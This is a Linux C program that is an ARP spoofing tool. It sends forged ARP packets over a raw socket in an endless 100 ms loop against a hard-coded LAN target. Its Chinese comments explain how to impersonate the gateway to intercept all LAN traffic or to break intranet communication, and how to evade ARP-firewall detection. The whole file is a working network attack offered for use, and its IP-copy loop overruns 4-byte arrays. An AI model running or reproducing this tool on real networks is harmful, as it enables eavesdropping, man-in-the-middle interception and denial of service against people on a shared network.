#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>

#include <asm/types.h>

#include <math.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#define PROTO_ARP 0x0806
#define ETH2_HEADER_LEN 14
#define HW_TYPE 1
#define PROTOCOL_TYPE 0x800
#define MAC_LENGTH 6
#define IPV4_LENGTH 4
#define ARP_REQUEST 0x01
#define ARP_REPLY 0x02
#define BUF_SIZE 60

struct arp_header {
	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned char hardware_len;
	unsigned char protocol_len;
	unsigned short opcode;
	unsigned char sender_mac[MAC_LENGTH];
	unsigned char sender_ip[IPV4_LENGTH];
	unsigned char target_mac[MAC_LENGTH];
	unsigned char target_ip[IPV4_LENGTH];
};

void main() {
	int sd;
	unsigned char buffer[BUF_SIZE];

	/**
	 * 在伪装成路由器情况下，
	 * 1.自身需要实现路由器所有功能，将数据包转发给真正的路由器。否则目标会立即发现外网不可达；
	 * 2. 由于有合法路由器在线，当被攻击目标主动发起arp查询时，合法路由器的响应会更新目标arp表，所以必须不断发送伪装的arp数据包到攻击目标 1秒1次;
	 * 3. 合法路由器有mac地址表，应该不会主动询问某个地址，因此这种攻击方式很容易被arp防火墙识别（除非拦截攻击目标的arp查询，在合法路由器响应之前抢先一步将伪装的响应包发送给攻击目标.合法路由器的响应与伪装地址不一致，arp防火墙能够检测- -#）
	 */
	unsigned char source_ip[4] = { 219, 216, 87, 170}; //可设置任意LAN ip，设置未网关并把mac配置为自己网卡mac则可以伪装成路由器，配合路由服务，拦截lan 所有数据包
	unsigned char source_mac[6] = { 0x1e, 0xed, 0x19, 0x27, 0x1a, 0xb3 }; //可任意设置，单纯为了破坏内网通讯情况下设置为任意值,如果是伪装成路由器则设置成自己的mac
	unsigned char target_ip[4] = { 219, 216, 87, 254}; //被攻击目标，循环发送给所有目标，并定时发送（压制）；

	struct ethhdr *send_req = (struct ethhdr *) buffer;
	struct ethhdr *rcv_resp = (struct ethhdr *) buffer;
	struct arp_header *arp_req =
		(struct arp_header *) (buffer + ETH2_HEADER_LEN);
	struct arp_header *arp_resp = (struct arp_header *) (buffer
			+ ETH2_HEADER_LEN);
	struct sockaddr_ll socket_address;
	int index, ret, length = 0;

	memset(buffer, 0x00, 60);

	for (index = 0; index < 6; index++) {

		send_req->h_dest[index] = (unsigned char) 0xff;
		arp_req->target_mac[index] = (unsigned char) 0x00;
		/* Filling the source  mac address in the header*/
		send_req->h_source[index] = (unsigned char) source_mac[index];
		arp_req->sender_mac[index] = (unsigned char) source_mac[index];
		socket_address.sll_addr[index] = (unsigned char) source_mac[index];
	}
	printf("Successfully got eth0 MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
			send_req->h_source[0], send_req->h_source[1], send_req->h_source[2],
			send_req->h_source[3], send_req->h_source[4],
			send_req->h_source[5]);
	printf(" arp_req MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
			arp_req->sender_mac[0], arp_req->sender_mac[1],
			arp_req->sender_mac[2], arp_req->sender_mac[3],
			arp_req->sender_mac[4], arp_req->sender_mac[5]);
	printf("socket_address MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
			socket_address.sll_addr[0], socket_address.sll_addr[1],
			socket_address.sll_addr[2], socket_address.sll_addr[3],
			socket_address.sll_addr[4], socket_address.sll_addr[5]);

	/*prepare sockaddr_ll*/
	socket_address.sll_family = AF_PACKET;
	socket_address.sll_protocol = htons(ETH_P_ARP);
	socket_address.sll_ifindex = 3; //手动指定设备, ip a 指令查看网卡序号
	socket_address.sll_hatype = htons(ARPHRD_ETHER);
	socket_address.sll_pkttype = (PACKET_BROADCAST);
	socket_address.sll_halen = MAC_LENGTH;
	socket_address.sll_addr[6] = 0x00;
	socket_address.sll_addr[7] = 0x00;

	/* Setting protocol of the packet */
	send_req->h_proto = htons(ETH_P_ARP);

	/* Creating ARP request */
	arp_req->hardware_type = htons(HW_TYPE);
	arp_req->protocol_type = htons(ETH_P_IP);
	arp_req->hardware_len = MAC_LENGTH;
	arp_req->protocol_len = IPV4_LENGTH;
	arp_req->opcode = htons(ARP_REQUEST);
	for (index = 0; index < 5; index++) {
		arp_req->sender_ip[index] = (unsigned char) source_ip[index];
		arp_req->target_ip[index] = (unsigned char) target_ip[index];
	}
	// Submit request for a raw socket descriptor.
	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket() failed ");
		exit(EXIT_FAILURE);
	}

	buffer[32] = 0x00;
	while(1){
		ret = sendto(sd, buffer, 42, 0, (struct sockaddr*) &socket_address,
			sizeof(socket_address));
		if (ret == -1) {
			perror("sendto():");
			exit(1);
		} else {
			printf(" Sent the ARP REQ \n");
			//for (index = 0; index < 42; index++) {
			//	printf("%02X ", buffer[index]);
			//	if (index % 16 == 0 && index != 0) {
			//		printf("\n\t");
			//	}
			//}
		}
		usleep(100000);
	}
	close(sd);
}
